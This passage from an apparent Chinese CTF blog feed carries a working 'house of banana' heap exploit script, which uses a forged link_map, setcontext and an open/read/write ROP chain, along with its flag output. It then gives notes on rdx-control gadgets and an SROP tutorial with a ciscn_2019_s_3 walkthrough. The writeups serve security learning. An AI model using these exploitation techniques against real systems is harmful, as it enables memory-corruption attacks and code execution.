class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;heap_base --&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    rtld_global = libc_base + <span class="number">0x228060</span> <span class="comment"># 这个是gdb调试出来的， 但是使用0x222060同时l_next修改为0x223740，则不需要爆破，为什么呢？</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#link_map3 = libc_base + 0x7f7018 </span></span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x4f302</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x119431</span></span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    ret = libc_base + <span class="number">0x22679</span> </span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    chunk_addr = heap_base + <span class="number">0xbd0</span></span><br><span class="line">    log.info(<span class="string">&quot;chunk_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">    link_map = p64(<span class="number">0</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x18</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + <span class="number">0x229740</span>) <span class="comment"># l_next </span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x28</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr) <span class="comment"># l_real</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x40</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1a</span>) + p64(chunk_addr + <span class="number">0x1f8</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x60</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1c</span>) + p64(<span class="number">0x10</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x110</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x40</span>) <span class="comment"># l_info[26]</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x60</span>) <span class="comment"># l_info[28]</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x1f8</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext+<span class="number">61</span>) + p64(ret) <span class="comment">#这里的ret所被布置地址会被赋给rdx，也就是chunk_addr + 0x200</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x330</span>) <span class="comment">#rdi</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) <span class="comment">#rsi</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x350</span>) <span class="comment">#rsp指向ropchain</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0xa8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="built_in">open</span>) <span class="comment">#rcx 会被pop进rip</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x31c</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p8(<span class="number">0x8</span>) <span class="comment"># l_init_called</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x330</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    ropchain = p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">            p64(chunk_addr + <span class="number">0x450</span>) + p64(pop_rdx_r12_ret) + \</span><br><span class="line">            p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read) + p64(pop_rdi_ret) + \</span><br><span class="line">            p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(chunk_addr + <span class="number">0x450</span>) + \</span><br><span class="line">            p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x350</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + ropchain</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>, link_map)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = start()</span><br><span class="line">        pwn()</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>).encode())</span><br><span class="line">        io.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  66 6c 61 67  7b 74 68 69  73 2d 61 2d  74 65 73 74  │flag│&#123;thi│s-a-│test│</span><br><span class="line">    00000010  2d 66 6f 72  2d 62 61 6e  61 6e 61 2d  6f 72 77 7d  │-for│-ban│ana-│orw&#125;│</span><br><span class="line">    00000020  0a 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000030</span><br><span class="line">flag&#123;this-a-test-for-banana-orw&#125;</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>除了<code>house of banana</code>，在其他<code>house of</code>攻击中，如果能控制<code>rdx</code>的话，也能利用<code>setcontext</code>打<code>ROP</code>，一通百通，这里不再列举</p><h4 id="gadget-to-control-rdx"><a href="#gadget-to-control-rdx" class="headerlink" title="gadget-to-control-rdx"></a>gadget-to-control-rdx</h4><p>然而<code>house of banana</code>攻击链中这种汇编指令级别的控制<code>rdx</code>的方法并不稳定，在高版本（哪个版本仍待考证）也许就不行了，那么找到一个可以控制<code>rdx</code>的<code>gadget</code>是有必要的，如果能转换<code>rdi</code>与<code>rdx</code>，那么<code>house of apple2</code>中利用<code>setcontext</code>来打<code>orw</code>也是可以实现的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]</span><br><span class="line">mov qword ptr [rsp], rax</span><br><span class="line">call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure><p>例如上面的<code>gadget</code>，可以通过<code>rdi</code>来控制<code>rdx</code>，并且存在<code>call</code>，对于像<code>house of apple2</code>这样只能劫持一次执行的攻击，执行流就不会断掉，也就可以再结合<code>setcontext</code>来进行<code>ROP</code>了</p><h2 id="0x02-利用-svcudp-reply"><a href="#0x02-利用-svcudp-reply" class="headerlink" title="0x02 利用 svcudp_reply"></a>0x02 利用 svcudp_reply</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span><br><span class="line">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure><p>在<code>libc.sym[&#39;svcudp_reply&#39;]+26</code>处有这样的<code>gadget</code>，可以通过<code>rdi</code>来控制<code>rbp</code>，从而控制<code>rax</code>，进而可以控制程序执行到<code>leave;ret</code>实现栈迁移也就劫持了<code>rsp</code>，那么就可以进行<code>ROP</code>了。对于<code>house of apple2</code>而言是进行<code>ROP</code>的利器</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SROP</title>
      <link href="/2025/09/02/%E5%85%B3%E4%BA%8ESROP/"/>
      <url>/2025/09/02/%E5%85%B3%E4%BA%8ESROP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>想起来好像没学，学一下</p><h2 id="0x01-前置知识-signal机制"><a href="#0x01-前置知识-signal机制" class="headerlink" title="0x01 前置知识 signal机制"></a>0x01 前置知识 signal机制</h2><p><code>signal</code>机制是类 <code>unix</code> 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 <code>kill</code> 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/images/ProcessOfSignalHandlering.png"></p><p>内核向某个进程发送 <code>signal</code> 机制，该进程会被暂时挂起，进入内核态。<br>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称<code> ucontext</code> 以及 <code>siginfo</code> 这一段为 <code>SignalFrame</code>。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 <code>signal handler</code>中处理相应的 <code>signal</code>。因此，当 <code>signal handler</code> 执行完之后，就会执行 <code>sigreturn</code> 代码。</p><p><img src="/images/signal2-stack.png"></p><p>对于 <code>signal Frame</code> 来说，会因为架构的不同而有所区别，这里给出 x64 的 <code>sigcontext</code></p><p><strong>x64</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>signal handler</code> 返回后，内核为执行 <code>sigreturn</code> 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 <code>pop</code> 回对应的寄存器，最后恢复进程的执行。其中，32 位的 <code>sigreturn</code> 的调用号为 <strong>119(0x77)<strong>，64 位的系统调用号为 <strong>15(0xf)</strong><br></strong><code>sigreturn</code>的特殊之处</strong>：<code>sigreturn</code>是一个非常特殊的系统调用。内核处理它时，并<strong>不会</strong>走常规的<code>sysret</code>返回路径。相反，它会：<br>一、根据当前用户态的<code>rsp</code>找到<code>sigframe</code>。<br>二、从<code>sigframe</code>中读取包括<code>rip</code>和<code>rsp</code>在内的所有通用寄存器的值。将这些值强制恢复到CPU的实际寄存器中。<br>三、最后，通过一个特殊的指令（如<code>iret</code>或<code>sysret</code>，但操作数已被修改）将控制权交还给用户空间，此时CPU将从被恢复的<code>rip</code>地址开始执行，并且栈指针也已经切换为被恢复的<code>rsp</code>值<br>最后总结一下信号处理流程</p><p><strong>信号传递（Kernel to User）</strong>：</p><ul><li>内核决定向一个用户进程传递信号。在切换回用户态之前，内核会在该进程的用户栈上创建一个<code>sigframe</code>。</li><li>这个<code>sigframe</code>保存了进程被中断时的完整上下文（寄存器状态、信号掩码等）。</li><li>在<code>sigframe</code>的底部，内核会放置一段调用<code>sigreturn</code>系统调用的代码片段作为<code>handler</code>返回地址。</li><li>内核修改进程的<code>rip</code>，使其指向信号处理函数（<code>signal handler</code>），并创建<code>handler</code>的栈帧</li></ul><p><strong>信号处理函数执行（User Space）</strong>：</p><ul><li>进程返回用户态，开始执行信号处理函数。</li><li>此时，栈的布局大致如下（栈向低地址方向增长）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+  &lt;-- 高地址</span><br><span class="line">|    ... (原始栈内容) ...     |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|         sigframe          |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|   Return Address for      |  (调用sigreturn)</span><br><span class="line">|      Handler              |</span><br><span class="line">+---------------------------+</span><br><span class="line">|   Handler&#x27;s saved RBP     |  </span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|  Handler&#x27;s Local Variables|  (handler的栈帧)</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+  &lt;-- rsp (在handler执行过程中的位置)</span><br></pre></td></tr></table></figure><p><strong>从信号处理函数返回（User to Kernel）</strong>：</p><ul><li>当信号处理函数执行<code>ret</code>指令，返回到调用<code>sigreurn</code></li><li>调用<code>sigreurn</code>的片段的核心就是 <code>mov rax, 15; syscall</code> （在x86-64中，15是<code>rt_sigreturn</code>的系统调用号）。</li></ul><p><strong>执行<code>sigreturn</code>（The Crucial Moment）</strong>：</p><ul><li>执行<code>syscall</code>指令 （<code>pop</code>进<code>rip</code>），<code>rsp</code>现在正好指向了<code>sigframe</code>的起始位置</li><li>内核接管控制，执行<code>sigreturn</code></li><li>内核相信此时的<code>rsp</code>正指向一个合法的<code>sigframe</code>（不检查）。它从<code>rsp</code>指向的内存地址开始，解析<code>sigframe</code>，并将其中保存的寄存器值恢复到CPU中。</li><li><strong>恢复完成</strong>：进程的<code>rip</code>、<code>rsp</code>以及其他所有寄存器都回到了信号发生前的状态。控制权返回用户空间，进程从被中断的地方“无缝”地继续执行，就好像什么都没发生过一样。原先为<code>sigframe</code>所占用的栈空间也自然而然地被“丢弃”了，因为<code>rsp</code>已经被恢复到了更高的地址。</li></ul><h2 id="0x02-攻击原理"><a href="#0x02-攻击原理" class="headerlink" title="0x02 攻击原理"></a>0x02 攻击原理</h2><p>攻击原理就很简单了，就是伪造<code>signal Frame</code>，触发<code>sigreturn</code>调用，控制寄存器和控制流，这也就是<code>SROP</code>的本质<br>SROP简要流程:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造 fake_frame  --&gt; 控制当前 rsp 指向 fake_frame 底部 --&gt; sigreturn 调用</span><br></pre></td></tr></table></figure><p><code>pwntools</code>集成了<code>SROP</code>的模块，可以帮助制作<code>fake_frame</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// e.g.</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read <span class="comment">#也可直接手写调用号</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure><p>一般来说在栈溢出进行<code>ROP</code>写调用<code>sigreturn</code>，然后在<code>syscall</code>后写入<code>sigframe</code>即可，需要注意的是，因为 <code>sigreturn</code> 系统调用 <strong>不会像普通函数一样返回到下一条 <code>ret</code><strong>，内核会直接修改用户态寄存器，并跳转到 <code>sigframe.rip</code>，所以我们需要确保的是 <code>sigreturn</code> 系统调用之后<code>rsp</code>指向<code>sigframe</code>底部（在<code>syscall</code>之后写入<code>sigframe</code>，执行<code>sigreturn</code>时将<code>syscall</code>指令<code>pop rip</code>后<code>rsp</code>正好指向<code>sigframe</code>）<br>需要注意的是，当我们构造<code>srop_chain</code>时候，<code>sigframe.rip</code>必须指向<code>syscall_ret</code> （至少这个<code>gadget</code>不会改变<code>rsp</code>），</strong>因为中途不可以打乱rsp指向</strong>，我们需要控制好<code>rsp</code>确保每次调用<code>sigreturn</code>时都指向目标<code>sigframe</code></p><p><img src="/images/srop-example-2.png"></p><p><img src="/images/srop-example-3.png"></p><h2 id="0x03-ciscn-2019-s-3"><a href="#0x03-ciscn-2019-s-3" class="headerlink" title="0x03 ciscn_2019_s_3"></a>0x03 ciscn_2019_s_3</h2><p>题目代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> vuln(argc, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004DA                 mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1                 retn</span><br><span class="line">...</span><br><span class="line">.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9                 retn</span><br><span class="line">...</span><br><span class="line">.text:0000000000400517                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519                 retn</span><br></pre></td></tr></table></figure><p>这题比较简单，除了<code>SROP</code>还可以打<code>ret2csu</code>，这里分析<code>SROP</code>. <br>调试发现这题有点怪的点就是缓冲区没有调整<code>rsp</code>来扩容，而是直接通过<code>[rsp-0x10]</code>来索引，猜测是直接使用两个系统调用函数以及缓冲区较小的原因，看调用<code>write</code>前的栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rbp rsp 0x7ffc0eb5e670 —▸ 0x4004ed (vuln) ◂— push rbp</span><br><span class="line">01:0008│+008     0x7ffc0eb5e678 —▸ 0x400536 (main+25) ◂— nop</span><br><span class="line">02:0010│+010     0x7ffc0eb5e680 —▸ 0x7ffc0eb5e778 —▸ 0x7ffc0eb5ef5f ◂— &#x27;/home/r3t2/ctf/buuctf/ciscn_2019_s_3/pwn_patched&#x27;</span><br><span class="line">03:0018│+018     0x7ffc0eb5e688 ◂— 0x100000000</span><br><span class="line">04:0020│+020     0x7ffc0eb5e690 —▸ 0x400540 (__libc_csu_init) ◂— push r15</span><br><span class="line">05:0028│+028     0x7ffc0eb5e698 —▸ 0x785c98a21c87 (__libc_start_main+231) ◂— mov edi, eax</span><br><span class="line">06:0030│+030     0x7ffc0eb5e6a0 ◂— 0x2000000000</span><br><span class="line">07:0038│+038     0x7ffc0eb5e6a8 —▸ 0x7ffc0eb5e778 —▸ 0x7ffc0eb5ef5f ◂— &#x27;/home/r3t2/ctf/buuctf/ciscn_2019_s_3/pwn_patched&#x27;</span><br></pre></td></tr></table></figure><p>看到栈上保留了栈地址<code>0x7ffc0eb5e778</code>会被输出，与<code>buf</code>的偏移是<code>0x7ffc0eb5e778</code> - <code>(rsp-0x10)</code> &#x3D; <code>0x118</code>，接下来<code>buf</code>写<code>/bin/sh</code>然后进行<code>SROP</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node5.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">27615</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory 